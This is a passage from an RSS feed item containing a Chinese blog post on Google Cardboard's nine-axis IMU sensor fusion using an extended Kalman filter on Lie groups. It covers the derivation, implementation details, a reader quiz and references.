&lt;p&gt;&lt;span&gt;接下来，为了转换成卡尔曼滤波的形式，用&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195805099-1801041744.png&quot; alt=&quot;&quot;/&gt;来表示。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以，原式就可以表示为，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195805401-640205642.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;参考《State Estimation for Robotics》的3.1.2和3.3.2，求&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195805700-597357513.png&quot; alt=&quot;&quot;/&gt;，则上式最终可以转换出卡尔曼滤波的形式了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195805963-1809458414.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195806256-1452651532.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;同时，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195806527-1756412733.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;则融合后的姿态的均值&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195806767-824334100.png&quot; alt=&quot;&quot;/&gt;为，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195807083-16393831.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;设相对于姿态&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195807332-678182329.png&quot; alt=&quot;&quot;/&gt;的李代数扰动&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195807554-225028861.png&quot; alt=&quot;&quot;/&gt;。则&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195807774-124991431.png&quot; alt=&quot;&quot;/&gt;与&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195807974-361363420.png&quot; alt=&quot;&quot;/&gt;的关系要满足，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195808336-1304588985.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以，得到扰动&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195809050-831552509.png&quot; alt=&quot;&quot;/&gt;的均值&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195809294-791986631.png&quot; alt=&quot;&quot;/&gt;，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195809662-1210950567.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;得到扰动&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195809985-162912049.png&quot; alt=&quot;&quot;/&gt;的协方差&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195810235-794676240.png&quot; alt=&quot;&quot;/&gt;，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180407220105879-1773780191.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195810967-1216419485.png&quot; alt=&quot;&quot;/&gt;的分布满足，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195811260-633531751.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;2.2公式总结&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;2.1中的公式总结出来就是，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195811661-312748851.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;上面的方法跟《&lt;/span&gt;State Estimation for Robotics》的7.3.4和8.2.4很像，但是上面的方法，对协方差的处理更加精细。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;要融合磁场计，也是同样的方法。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;要融合视觉SLAM中送过来的姿态，也是同样的方法。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;3.实际程序&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;在cardboard的实际程序中，还有很多细节的处理。比如，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;增加了很多加权滤波的方法。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;把加速度计的模的变化滤波出来，实时更新加速度计的协方差。这一步，相当于是madgwick里面的动态调整权重，但这一步更好，因为是直接算加速度计的协方差来调整权重，而不是通过陀螺仪的测量值来间接表示运动过快而调整权重。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在静止的时候，把陀螺仪的偏移滤波出来。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;还有时间差平滑滤波的方法。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在融合磁场计的时候，把磁场计向量映射到水平面上，相当于只优化水平面上的旋转偏差。这个，在空间想象时，应该保持重力竖直方向（0,0,1）不变，以此作为参考，再看原来的模型，就容易理解了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180407213210903-1869166221.png&quot; alt=&quot;&quot;/&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195812642-1241522466.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;但是没有对磁场计进行修正。如果要对磁场计进行修正，简单的方法可以参考madgwick里面的方法。全面的方法，则要参考那些专门搞磁场计标定的论文了。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;4.总结&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;Cardboard里面的九轴融合算法，效果比Madgwick方法和互补滤波方法都要好，对细节的处理也非常棒。以后再写一篇文章，详细比较基于李群的扩展卡尔曼滤波方法，Madgwick算法，互补滤波的异同。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;根据参考文献[1]，这套理论也同样可以使用在六自由度（位移+旋转）融合上面，只需要把SO3改成SE3就可以了。可以用同一套理论，把视觉SLAM的位姿与IMU位姿融合在一起，得到融合后的六自由度数据，应用在VR头显中。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;希望有一天，VR头显的体验能做到像电影《头号玩家》里面那样。与仍然还在做VR的各位同行共勉。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195813252-1141179203.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;5.求赞赏&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;您觉得，本文值多少？ &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180407001221081-397284790.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;6.有奖问答&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;给各位出一道思考题。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;已知，一个IMU水平地放在桌面上不动。重力大小为&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195813585-1483619777.png&quot; alt=&quot;&quot;/&gt;。陀螺仪和加速度计以相同的频率同时输出，输出的时间间隔为&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195813793-1535060154.png&quot; alt=&quot;&quot;/&gt;。它的初始状态为&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195814142-1921226462.png&quot; alt=&quot;&quot;/&gt;。陀螺仪数据的噪声为&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195814392-1036872103.png&quot; alt=&quot;&quot;/&gt;，加速度计数据的噪声为&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195814629-1147621172.png&quot; alt=&quot;&quot;/&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195814944-678470538.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;其中，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195815229-444849715.png&quot; alt=&quot;&quot;/&gt;，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195815459-522326875.png&quot; alt=&quot;&quot;/&gt;，&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180403195815729-1704841531.png&quot; alt=&quot;&quot;/&gt;都为对角矩阵。则随着时间的增长，请问，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;（1）这个IMU的后验状态协方差是否会收敛？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;（2）如果收敛的话，会收敛到什么值？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;请在下面评论区作答。第一名正确回答的，将可以获得哈士企公仔一只。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/699318/201804/699318-20180407210909816-1651787543.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt;7.参考文献&lt;/h2&gt;

&lt;ol readability=&quot;2&quot;&gt;&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;Bourmaud G, Megret R, Giremus A, et al. Discrete Extended Kalman Filter on Lie groups[C]// Signal Processing Conference. EURASIP, 2013:1-5.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;Timothy D. Barfoot. State Estimation for Robotics [M].Cambridge University Press, 2017.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Sun, 15 Apr 2018 12:52:00 +0000</pubDate>
<dc:creator>极品巧克力</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/ilekoaiq/p/8710812.html</dc:identifier>
</item>
</channel>
</rss>